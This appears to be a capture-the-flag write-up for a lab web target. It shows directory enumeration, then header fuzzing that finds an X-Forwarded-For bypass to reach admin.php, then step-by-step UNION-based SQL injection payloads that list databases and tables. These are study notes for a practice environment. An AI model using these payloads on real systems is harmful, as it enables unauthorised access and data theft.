### Enum
```bash
feroxbuster -u http://10.129.157.71:80/ -t 10 -w /root/.local/share/AutoRecon/wordlists/dirbuster.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -e -r -o 

200      GET        1l       15w       89c http://10.129.157.71/ADMIN.php
```

##### page source of admin.php
```php
<!-- To Do:
	- Import Products
	- Link to new payment system
	- Enable SSL (Certificates location \\192.168.4.28\myfiles)
<!-- Header -->
```

##### wfuzz the host header
* https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers

Get the `http_header.list` through ChatGPT. Although, that's not 100% correct.

So let's use `http-request-headers-fields-large.txt`

```bash
wfuzz -c -w http_header.list -u http://$IP/admin.php -H "FUZZ: 192.168.4.28"

# Filter the chars
# --hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars

wfuzz -c -w /usr/share/seclists/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt -u http://$IP/admin.php -H "FUZZ: 192.168.4.28" --hh 89

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000145:   400        6 L      34 W       374 Ch      "Content-Length"                        
000000732:   501        6 L      26 W       343 Ch      "Transfer-Encoding"                
000000923:   200        153 L    466 W      7933 Ch     "X-Forwarded-For"    
```

Use `simple-modify-headers` on github.

### Web Enum
Now, I get the access of `admin.php`. Setup with `simple-modify-headers` with burp, let's SEARCH the sqli since it's quite obvious.

#### SQLI find number of columns
1. `'` 

```bash burp
POST /search_products.php HTTP/1.1
Host: 10.129.170.188
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://10.129.170.188
Connection: close
Referer: http://10.129.170.188/admin.php
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28
-: -

productName='

Error: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1		
```

2. `DWA'#`

No Products Found, it's same result as the legit `DWA`.

3. `' order by 7-- -`
						Error: SQLSTATE[42S22]: Column not found: 1054 Unknown column '7' in 'order clause'

So it has 6 columns.

#### Extract database names, table names and column names
* https://book.hacktricks.xyz/pentesting-web/sql-injection#extract-database-names-table-names-and-column-names
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-database-with-information_schema
* https://github.com/A1vinSmith/OSCP-PWK/wiki/SQL-Injection

The HTB Academy cheatsheet is also good.

###### list database names
```sql
productName='+Union+Select+1,2,3,4,5,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata--+-
```

|information_schema|,|mysql|,|warehouse|

###### Current database name
```sql
'+Union+Select+1,2,3,4,5,database()--+-
```

warehouse

###### List all tables in a specific database, warehouse
```sql
' UniOn Select 1,2,3,4,5,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema='warehouse'-- -
' UNION select 1,2,3,4,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='warehouse'-- -
```

|product|,|product_category|,|product_pack|

